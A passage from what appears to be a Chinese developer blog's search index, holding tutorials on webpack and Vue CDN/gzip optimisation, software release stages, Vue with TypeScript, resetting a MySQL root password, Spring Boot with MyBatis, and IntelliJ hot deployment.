{ loader: &#39;file-loader&#39;, options: { name: &#39;fonts/[name].[hash:8].[ext]&#39; } } // 项目设置打包到dist下的fonts文件夹下 ] } ] }, plugins: [ new HtmlWebpackPlugin({ minify: { removeAttributeQuotes: true // 去掉属性值后的双引号 }, hash: true, template: &#39;./src/index.html&#39;, inject: &#39;body&#39; }), new CleanWebpackPlugin([&#39;dist&#39;]), new MiniCssExtractPlugin({ filename: &#39;css/[name]-[hash:32].css&#39; }), new OptimizeCssAssetsPlugin({ assetNameRegExp: /\.css$/g, cssProcessor: require(&#39;cssnano&#39;), cssProcessorOptions: { safe: true, discardComments: { removeAll: true } }, canPrint: true }), new OpenBrowserPlugin({ url: &#39;http://localhost:3000&#39; }), new CompressionWebpackPlugin({ test: new RegExp(&#39;\\.(&#39; + productionGzipExtensions.join(&#39;|&#39;) + &#39;)$&#39;), threshold: 8192, minRatio: 0.8 }) ], devServer: { contentBase: path.join(__dirname, &#39;dist&#39;), compress: true, port: 3000 } }]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue 项目性能优化(首屏优化)]]></title>
    <url>%2Farchives%2F431a5c80.html</url>
    <content type="text"><![CDATA[随着 Vue 项目越做越大,依赖的第三方 npm 包越来越多,构建之后的文件也会越来越大,尤其是 vendor.js,甚至会达到 2M 左右, 为了解决这个问题,需要做一些探索,在几乎不需要改动业务代码的情况下,找到了几种有明显效果的优化方案 —— CDN + Gzip好景不长先来看看没有任何优化的项目需要优化些什么首先是文件大小这是一个通过 Vue-cli 3.0 构建的 demo 项目,先执行一下 npm run build,当然也可以通过 vue ui 的 GUI 界面进行编译可以看到这个默认项目的各个 JS 文件还可以,不算是比较大的加载速度禁用浏览器缓存,网速限定为 Fast 3G 下的 Network 图(运行在本地的nginx服务器上)嗯~ ,故意调了个比较慢的网络环境,可以看到这边的加载速度真的慢到极致了CDN首先是 CDN 优化,把比较经常使用的依赖,像 vue,vue-router,vuex,element-ui,axios,loadsh 直接使用 CDN 来分发,这边选用的 CDN 服务是 bootcdnvue.config.jsconst externals = { &#39;vue&#39;: &#39;Vue&#39;, &#39;vue-router&#39;: &#39;VueRouter&#39;, &#39;vuex&#39;: &#39;Vuex&#39;, &#39;axios&#39;: &#39;axios&#39;, &#39;element-ui&#39;: &#39;ELEMENT&#39;, &#39;_&#39;: &#39;lodash&#39; } const cdn = { // 开发环境 dev: { css: [ &#39;https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css&#39; ], js: [] }, // 生产环境 build: { css: [ &#39;https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css&#39; ], js: [ &#39;https://cdn.bootcss.com/vue/2.5.17/vue.min.js&#39;, &#39;https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js&#39;, &#39;https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js&#39;, &#39;https://cdn.bootcss.com/axios/0.18.0/axios.min.js&#39;, &#39;https://cdn.bootcss.com/lodash.js/4.17.11/lodash.min.js&#39;, &#39;https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/index.js&#39; ] } } module.exports = { productionSourceMap: false, configureWebpack: config =&gt; { const myConfig = {} if (process.env.NODE_ENV === &#39;production&#39;) { // 1\. 生产环境 npm 包转 CDN myConfig.externals = externals } if (process.env.NODE_ENV === &#39;development&#39;) { /** * 关闭host check,方便使用ngrok之类的内网转发工具 */ myConfig.devServer = { disableHostCheck: true } } return myConfig }, chainWebpack: config =&gt; { /** * 删除懒加载模块的prefetch,降低带宽压力 * https://cli.vuejs.org/zh/guide/html-and-static-assets.html#prefetch * 而且预渲染时生成的prefetch标签是modern版本的,低版本浏览器是不需要的 */ config.plugins .delete(&#39;prefetch&#39;) /** * 添加CDN参数到htmlWebpackPlugin配置中 */ config .plugin(&#39;html&#39;) .tap(args =&gt; { if (process.env.NODE_ENV === &#39;production&#39;) { args[0].cdn = cdn.build } if (process.env.NODE_ENV === &#39;development&#39;) { args[0].cdn = cdn.dev } return args }) } } index.html&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;demo&lt;/title&gt; &lt;!-- 使用CDN加速的CSS文件,配置在vue.config.js下 --&gt; &lt;% for (var i in htmlWebpackPlugin.options.cdn&amp;&amp;htmlWebpackPlugin.options.cdn.css) { %&gt; &lt;link href=&quot;&lt;%= htmlWebpackPlugin.options.cdn.css[i] %&gt;&quot; rel=&quot;preload&quot; as=&quot;style&quot;&gt; &lt;link href=&quot;&lt;%= htmlWebpackPlugin.options.cdn.css[i] %&gt;&quot; rel=&quot;stylesheet&quot;&gt; &lt;% } %&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#39;re sorry but demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- 使用CDN加速的JS文件,配置在vue.config.js下 --&gt; &lt;% for (var i in htmlWebpackPlugin.options.cdn&amp;&amp;htmlWebpackPlugin.options.cdn.js) { %&gt; &lt;script src=&quot;&lt;%= htmlWebpackPlugin.options.cdn.js[i] %&gt;&quot;&gt;&lt;/script&gt; &lt;% } %&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt; &lt;/html&gt; 优化对比再来看看使用了 CDN 之后的编译大小天哪!!! chunk-vendors 这个文件小了不是一点点chunk-vendors 该文件打包了 vue,vuex,vue-router 等依赖资源,这也是这个文件之所以大的原因因为是优化产品模式下的代码,这里就构建一个 Nginx 服务器来查看加载的情况构建的话,自行百度,比较懒的推荐 upupw ,当然闲的无聊的话可以写一个 express 当作本地服务器果然加载的速度变快了许多Gzip使用 Gzip 两个明显的好处,一是可以减少存储空间,二是通过网络传输文件时,可以减少传输的时间。开启 gzip 的方式主要是通过修改服务器配置,这里贴出 nginx 的配置方式http { gzip on; gzip_static on; gzip_min_length 1024; gzip_buffers 4 16k; gzip_comp_level 2; gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php application/vnd.ms-fontobject font/ttf font/opentype font/x-woff image/svg+xml; gzip_vary off; gzip_disable &quot;MSIE [1-6]\.&quot;; } 当然只有 nginx 这边开启了 gzip 是不够的,webpack 工具提供了 productionGzip 来开启 gzip在此之前还需安装一个依赖项npm i -D compression-webpack-plugin 补全 vue.config.jsconst CompressionWebpackPlugin = require(&#39;compression-webpack-plugin&#39;) const externals = { &#39;vue&#39;: &#39;Vue&#39;, &#39;vue-router&#39;: &#39;VueRouter&#39;, &#39;vuex&#39;: &#39;Vuex&#39;, &#39;axios&#39;: &#39;axios&#39;, &#39;element-ui&#39;: &#39;ELEMENT&#39;, &#39;_&#39;: &#39;lodash&#39; } const cdn = { // 开发环境 dev: { css: [ &#39;https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css&#39; ], js: [] }, // 生产环境 build: { css: [ &#39;https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/theme-chalk/index.css&#39; ], js: [ &#39;https://cdn.bootcss.com/vue/2.5.17/vue.min.js&#39;, &#39;https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js&#39;, &#39;https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js&#39;, &#39;https://cdn.bootcss.com/axios/0.18.0/axios.min.js&#39;, &#39;https://cdn.bootcss.com/lodash.js/4.17.11/lodash.min.js&#39;, &#39;https://cdnjs.cloudflare.com/ajax/libs/element-ui/2.4.7/index.js&#39; ] } } // 是否使用gzip const productionGzip = true // 需要gzip压缩的文件后缀 const productionGzipExtensions = [&#39;js&#39;, &#39;css&#39;] module.exports = { productionSourceMap: false, configureWebpack: config =&gt; { const myConfig = {} if (process.env.NODE_ENV === &#39;production&#39;) { // 1\. 生产环境 npm 包转 CDN myConfig.externals = externals myConfig.plugins = [] // 构建时开启gzip,降低服务器压缩对CPU资源的占用,服务器也要相应开启gzip productionGzip &amp;&amp; myConfig.plugins.push( new CompressionWebpackPlugin({ test: new RegExp(&#39;\\.(&#39; + productionGzipExtensions.join(&#39;|&#39;) + &#39;)$&#39;), threshold: 8192, minRatio: 0.8 }) ) } if (process.env.NODE_ENV === &#39;development&#39;) { /** * 关闭host check,方便使用ngrok之类的内网转发工具 */ myConfig.devServer = { disableHostCheck: true } } return myConfig }, chainWebpack: config =&gt; { /** * 删除懒加载模块的prefetch,降低带宽压力 * https://cli.vuejs.org/zh/guide/html-and-static-assets.html#prefetch * 而且预渲染时生成的prefetch标签是modern版本的,低版本浏览器是不需要的 */ config.plugins .delete(&#39;prefetch&#39;) /** * 添加CDN参数到htmlWebpackPlugin配置中 */ config .plugin(&#39;html&#39;) .tap(args =&gt; { if (process.env.NODE_ENV === &#39;production&#39;) { args[0].cdn = cdn.build } if (process.env.NODE_ENV === &#39;development&#39;) { args[0].cdn = cdn.dev } return args }) } }]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件版本周期]]></title>
    <url>%2Farchives%2Fcdcc30dc.html</url>
    <content type="text"><![CDATA[软件版本周期是指计算机软件的发展及发行过程,从Pre-alpha（准预览版本）发展到Alpha（预览版本）、Beta（测试版本）、Released candidate （最终测试版本）至最后的Gold（完成版）一张图诠释发展软件的过程开发期Pre-alpha有时候软件会在Alpha或Beta版本前先发布Pre-alpha版本。一般而言相对于Alpha或Beta版本,Pre-alpha版本是一个功能不完整的版本AlphaAlpha 版本仍然需要测试,其功能亦未完善,因为它是整个软件发布周期中的第一个阶段,所以它的名称是”Alpha”,希腊字母中的第一个字母”α”。Alpha 版本通常会送到开发软件的组织或某群体中的软件测试者作内部测试。在市场上,越来越多公司会邀请外部客户或合作伙伴参与其测试。这令软件在此阶段有更大的可用性测试。在测试的第一个阶段中,开发者通常会进行白盒测试。其他测试会在稍后时间由其他测试团体以黑盒或灰盒技术进行,不过有时会同时进行。BetaBeta 版本是软件最早对外公开的软件版本,由公众（通常为公司外的第三方开发者和业余玩家）参与测试。 因为是 Alpha 的下一个阶段,所以为希腊字母的第二个字 Beta (β)。 一般来说,Beta 包含所有功能,但可能有一些已知问题和较轻微的程序错误（BUG）,要进行除错（debug）。Beta版本的测试者通常是开发软件的组织的客户,他们会以免费或优惠价钱得到软件。Beta版本亦作为测试产品的支持和市场反应等。其他情况不同企业有不同的称法,例如微软曾以 Community Technology Preview（简称 CTP,中文称为”社群技术预览”）为发布软件的测试版本之一,微软将这个阶段的软件散布给有需要先行试用的用户或厂商,并收集这些人的使用经验,以便作为进一步修正软件的参考。Release CandidateRelease Candidate（简称RC）指可能成为最终产品的候选版本,如果未出现问题则可发布成为正式版本。在此阶段的产品通常包含所有功能、或接近完整,亦不会出现严重问题。多数开源软件会推出两个 RC 版本,最后的 RC2 则成为正式版本。闭源软件较少公开使用,微软公司在 Windows 7上应用此名称。苹果公司把在这阶段的产品称为”Golden Master Candidate”（简称 GM Candidate）,而最后的 GM 即成为正式版本。完成期Release to Manufacting,RTM生产商发放（Release to Manufacturing,缩写 RTM）是软件产品准备交付时使用的术语,来自于以前还需要使用实体载具（光盘,硬盘等）来进行安装的时代。某些计算机程序以”RTM”作为软件版本代号,例如微软 Windows 7 发行零售版前的RTM版本主要是发放给组装机生产商用,使制造商能够提早进行集成工作或解决软件与硬件设备可能遇到的错误。RTM 版本并不一定意味着创作者解决了软件所有问题；仍有可能向公众发布前更新版本。以 Windows 7 为例：RTM 版与零售版的版本号是一样的。General availability,GA一般可用（General availability, 缩写 GA）是所有必要的商业活动已经完成,该软件产品已经可以发售的阶段。然而,这取决于语言、地域和电子设备与媒体的可用性,有些地区之间可能会有上市时间的延迟。商业活动可能也包括安全性和合法测试,以及本地化和全球销售的可能性评估。RTM 与 GA 的间隔可能会是 1 周或几个月,因为在此过程中需要进行许多商业活动。在这个阶段,可以说软件已经”上线”了。Release to Web,RTW网络分发（Release to Web,缩写 RTW）,或称 Web 发布是一种利用互联网进行分发的软件交付方式。制造商在这种类型的发布中并不生产实体软件工具,而会借由 OTA 来进行发放。随着互联网使用人数的增长,RTW变得越来越普遍。Stable稳定版本来自预览版本释出使用与改善而修正完成,通常是初始版本进行几个小更新后的版本。为目前所使用的软件在匹配需求规格的硬件与操作系统中运行不会造成严重的不兼容或是硬件冲突,其已受过某定量的测试无误后所释出者。]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>Criterion</tag>
        <tag>Debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue 全家桶结合 TypeScript]]></title>
    <url>%2Farchives%2F634b4de.html</url>
    <content type="text"><![CDATA[自从 vue cli 升级到 3.0 之后,vue 项目对 TypeScript 的支持度也不断的提升,为了更好的学习 TypeScript,本篇文章记录着 vue 全家桶结合 TypeScript 的食用方式vue-cli 3.0cli 工具到底升级了什么GUI 项目管理界面更加简洁的目录结构TypeScript 的支持Git Hook 提交 commit 的时候检查代码的规范性依赖和插件管理更加方便(GUI 管理)Progressive Web App 的支持Vue Router &amp; VuexESLint / TSLint / Prettier用 Jest 或 Mocha 进行单元测试用 Cypress 或者 Nightwatch 进行 E2E 测试预配置webpack功能,如模块热替换、代码拆分、 摇树优化（tree-shaking）、高效持久化缓存等通过 Babel 7 + preset-env（Babel插件）对 ES2017进行转换和基于使用情况注入 polyfill支持 PostCSS（默认启用 autoprefixer）和所有主要的 CSS 预处理器安装npm i -g @vue/cli 创建项目vue create [productName] # or vue ui 在选方案时,记得把 TypeScript 的支持勾选TypeScriptTypeScript 是一种由微软开发的自由和开源的编程语言。它是 JavaScript 的一个超集,而且本质上向这个语言添加了可选的静态类型和基于类的面向对象编程.TypeScript 扩展了JavaScript语法,任何已经存在的JavaScript程序,可以不加任何改动,在TypeScript环境下运行。TypeScript只是向JavaScript添加了一些新的遵循ES6规范的语法,以及基于类的面向对象编程的这种特性。在项目中食用 TypeScriptvuedata&lt;script lang=&quot;ts&quot;&gt; import Vue from &#39;vue&#39; import Component from &#39;vue-class-component&#39; @Component export default class App extends Vue { msg1:number = 123 msg2:String = &#39;hello word&#39; obj:Object = { msg1: 123, msg2: &#39;hello word&#39; } arr:Array = [ 123, &#39;hello word&#39; ] } &lt;/script&gt; ======&gt;&lt;script&gt; export default { name: &#39;App&#39;, data () { return { msg1: 123, msg2: &#39;hello word&#39;, obj: { msg1: 123, msg2: &#39;hello word&#39; }, arr: [ 123, &#39;hello word&#39; ] } } } &lt;/script&gt; watch@Watch(path: string, options: WatchOptions = {})&lt;script lang=&quot;ts&quot;&gt; import { Vue, Component, Watch } from &#39;vue-property-decorator&#39; @Component export default class YourComponent extends Vue { @Watch(&#39;child&#39;) onChildChanged(val: string, oldVal: string) { } @Watch(&#39;person&#39;, { immediate: true, deep: true }) onPersonChanged(val: Person, oldVal: Person) { } } &lt;/script&gt; ======&gt;&lt;script&gt; export default { watch: { &#39;child&#39;: { handler: &#39;onChildChanged&#39;, immediate: false, deep: false }, &#39;person&#39;: { handler: &#39;onPersonChanged&#39;, immediate: true, deep: true } }, methods: { onChildChanged(val, oldVal) { }, onPersonChanged(val, oldVal) { } } } &lt;/script&gt; vuexaxios需要安装描述文件yarn add -D @types/axios 一个栗子config.tsconst serverURL: String = &#39;http://127.0.0.1:8090/api&#39; export { serverURL as url } axios.tsimport axios from &#39;axios&#39; import { url } from &#39;@/config&#39; const protocol = window.location.protocol const host = window.location.host const domain = document.domain let serverURL: any = &#39;&#39; if (domain === &#39;127.0.0.1&#39; || domain === &#39;localhost&#39;) { serverURL = url } else { serverURL = `${protocol}` + &#39;//&#39; + `${host}:8090/api` } // 创建 axios 实例 const instance = axios.create({ baseURL: serverURL, timeout: 0 }) export default instance]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
        <tag>Vuex</tag>
        <tag>VueRouter</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[更新 MySQL root 的密码]]></title>
    <url>%2Farchives%2F6a26fc31.html</url>
    <content type="text"><![CDATA[最近在 ubuntu 系统上安装了 MySQL,但是安装时没有提示输入 root 用户密码,网上胡乱找了一通,这才知道 MySQL 5.7 以上版本的 root 密码都是随机生成的,所以这里提供解决 MySQL 5.7 版本的 root 用户重置密码问题安装 MySQLapt-get install mysql-cilent mysql-server 解决MySQL 5.7版本的root用户重置密码问题 安装之后可以使用下面的命令来检查是否安装成功sudo netstat -tap | grep mysql netstat -tap | grep mysql 登录 MySQLmysql -u root -p 输入密码,如果可以进入则下面的不用看了；如果提示不能登入,则我们尝试启用安全模式登入MySQL,这样可以绕过密码登入,登入后再修改密码。修改密码修改配置文件my.cnf =&gt; 不同系统的配置文件名以及存放路径不一致,但一定能在 /etc/mysql 里找到在 [mysqld] 小节下添加一行,这一行配置让 mysqld 启动时不对密码进行验证[mysqld] skip-grant-tables=1 修改完成之后保存重启 MySQL 服务/etc/init.d/mysql restart 无密码登录 MySQL 修改密码mysql -u root -p 执行以下操作mysql&gt; use mysql; mysql&gt; update user set authentication_string=PASSWORD(&quot;这里输入你要改的密码&quot;) where User=&#39;root&#39;;#更改密码 mysql&gt; update user set plugin=&quot;mysql_native_password&quot;;#如果没这一行可能也会报一个错误,因此需要运行这一行 mysql&gt; flush privileges;#更新所有操作权限 mysql&gt; quit 完成配置重启删掉或者注释 skip-grant-tables=1 该行配置修改完成之后保存重启 MySQL 服务/etc/init.d/mysql restart 之后使用设置的密码登录即可mysql -u root -p 附上完全卸载 MySQL 命令apt-get autoremove mysql-* dpkg -l |grep ^rc|awk &#39;{print $2}&#39; |sudo xargs dpkg -P]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot 整合 Mybatis]]></title>
    <url>%2Farchives%2F78923493.html</url>
    <content type="text"><![CDATA[MyBatis 是一款优秀的持久层框架,它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。这里介绍 Spring Boot 整合 Mybatis 的步骤,数据库选用 MYSQL创建 Spring Boot 项目本博客之前已经介绍过了,这里就不在叙述修改 pom.xml&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; 修改 Spring Boot 配置文件这里使用 yml 格式的配置文件,将 application.properties 改名为 application.yml,下面配置请根据自己的需求而修改# 端口 server: port: 8080 # 配置数据源 spring: datasource: url: jdbc:mysql://127.0.0.1:3306/databaseName?useUnicode=true&amp;characterEncoding=utf8 username: root password: root driver-class-name: com.mysql.jdbc.Driver # 打印 SQL 语句信息 logging: level: com.mysql.api: debug debug: false Spring Boot 会自动加载 application.yml 相关配置,数据源就会自动注入到s qlSessionFactory 中,sqlSessionFactory 会自动注入到 Mapper 中。使用插件快速生成代码配置 pom.xml添加 Mybatis-generator 插件&lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;configuration&gt; &lt;configurationFile&gt;src/main/resources/generatorConfig.xml&lt;/configurationFile&gt; &lt;verbose&gt;true&lt;/verbose&gt; &lt;overwrite&gt;true&lt;/overwrite&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;Generate MyBatis Artifacts&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;generate&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 编写配置文件 generatorConfig.xml在 IntelliJ IDEA 开发环境下,此文件需要放在 resource 根目录下,mybatis generator 默认加载此目录的配置文件,以下文件需要根据自己的情况进行配置&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt; &lt;generatorConfiguration&gt; &lt;!--数据库驱动jar --&gt; &lt;classPathEntry location=&quot;D:\.m2\repository\mysql\mysql-connector-java\5.1.33\mysql-connector-java-5.1.33.jar&quot; /&gt; &lt;context id=&quot;Tables&quot; targetRuntime=&quot;MyBatis3&quot;&gt; &lt;!--去除注释 --&gt; &lt;commentGenerator&gt; &lt;property name=&quot;suppressDate&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;suppressAllComments&quot; value=&quot;true&quot; /&gt; &lt;/commentGenerator&gt; &lt;!--数据库连接 --&gt; &lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot; connectionURL=&quot;jdbc:mysql://129.1.18.18:3306/ssm_demo&quot; userId=&quot;root&quot; password=&quot;root&quot;&gt; &lt;/jdbcConnection&gt; &lt;!--默认false Java type resolver will always use java.math.BigDecimal if the database column is of type DECIMAL or NUMERIC. --&gt; &lt;javaTypeResolver&gt; &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot; /&gt; &lt;/javaTypeResolver&gt; &lt;!--生成实体类 指定包名 以及生成的地址 （可以自定义地址,但是路径不存在不会自动创建 使用Maven生成在target目录下,会自动创建） --&gt; &lt;javaModelGenerator targetPackage=&quot;com.myapp.api.entity&quot; targetProject=&quot;src/main/java&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot; /&gt; &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot; /&gt; &lt;/javaModelGenerator&gt; &lt;!--生成SQLMAP文件 --&gt; &lt;sqlMapGenerator targetPackage=&quot;mapping&quot; targetProject=&quot;src/main/resources&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- 生成DAO的包名和位置--&gt; &lt;!-- XMLMAPPER生成xml映射文件, ANNOTATEDMAPPER 生成的 dao 采用注解来写sql --&gt; &lt;javaClientGenerator type=&quot;ANNOTATEDMAPPER&quot; targetPackage=&quot;com.myapp.api.mapper&quot; targetProject=&quot;src/main/java&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt; &lt;/javaClientGenerator&gt; &lt;!--对应数据库表 mysql可以加入主键自增 字段命名 忽略某字段等 --&gt; &lt;table tableName=&quot;&quot; domainObjectName=&quot;&quot; enableCountByExample=&quot;false&quot; enableUpdateByExample=&quot;false&quot; enableDeleteByExample=&quot;false&quot; enableSelectByExample=&quot;false&quot; selectByExampleQueryId=&quot;false&quot; /&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; 在 IntelliJ IDEA 配置配置命令 mybatis-generator:generate -e配置好之后点击旁边的运行按钮当然也可以在 plugins 中找到 mybatis-generator,双击运行或右击运行都可]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>Maven</tag>
        <tag>Java</tag>
        <tag>Mybatis</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在 IntelliJ IDEA 中配置 Spring Boot 项目的热部署]]></title>
    <url>%2Farchives%2Ffc012b51.html</url>
    <content type="text"><![CDATA[Spring Boot 是由 Pivotal 团队提供的全新框架,其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置,从而使开发人员不再需要定义样板化的配置。Spring Boot 的 Web 项目,在每一次修改了 java 文件或者是 resource 的时候,都必须去重启一下项目,这样的话浪费了很多的时间,实现了热部署,在每一次作了修改之后,都会自动的重启使用 IntelliJ IDEA 创建 Spring Boot 项目新建 Spring Initializr 项目填写项目信息选择项目使用的技术填写项目名称项目架构及依赖添加测试控制器找到入口的文件,将其修改成如下所示package com.springboot.first; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @SpringBootApplication public class FirstApplication { @RequestMapping(&quot;/&quot;) String index() { return &quot;Hello Spring Boot&quot;; } public static void main(String[] args) { SpringApplication.run(FirstApplication.class, args); } } @SpringBootApplication 是 Spring Boot 项目的核心注解,主要目的是开启自动配置。main方法是一个标准的Java应用的main方法,主要作用是作为项目启动的入口。访问测试运行项目,把它当成一个java类运行就可以了运行信息浏览器访问IntelliJ IDEA 配置热部署配置 pom.xml引入热加载的插件&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; project 中添加 spring-boot-maven-plugin,主要在 eclipse 中起作用,idea 不需要加此配置,springboot 项目的话,应该是有此配置,加里面的内容即可。&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 配置 Maven 下载加速右键项目选中 maven 选项,然后选择 “open settings.xml” 或者 “create settings.xml”,然后把如下代码粘贴进去就可以了.重启IDE,感受速度飞起来的感觉吧！！！&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt; &lt;mirrors&gt; &lt;!-- mirror | Specifies a repository mirror site to use instead of a given repository. The repository that | this mirror serves has an ID that matches the mirrorOf element of this mirror. IDs are used | for inheritance and direct lookup purposes, and must be unique across the set of mirrors. | &lt;mirror&gt; &lt;id&gt;mirrorId&lt;/id&gt; &lt;mirrorOf&gt;repositoryId&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://my.repository.com/repo/path&lt;/url&gt; &lt;/mirror&gt; --&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;uk&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://uk.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;CN&lt;/id&gt; &lt;name&gt;OSChina Central&lt;/name&gt; &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;nexus&lt;/id&gt; &lt;name&gt;internal nexus repository&lt;/name&gt; &lt;!-- &lt;url&gt;http://192.168.1.100:8081/nexus/content/groups/public/&lt;/url&gt;--&gt; &lt;url&gt;http://repo.maven.apache.org/maven2&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;/mirrors&gt; &lt;/settings&gt; IntelliJ IDEA 相关配置点击 file ,Settings ,Build ,Execution,Deplment然后记得apply,ok组合键：Shift+ALT+Ctrl+/ 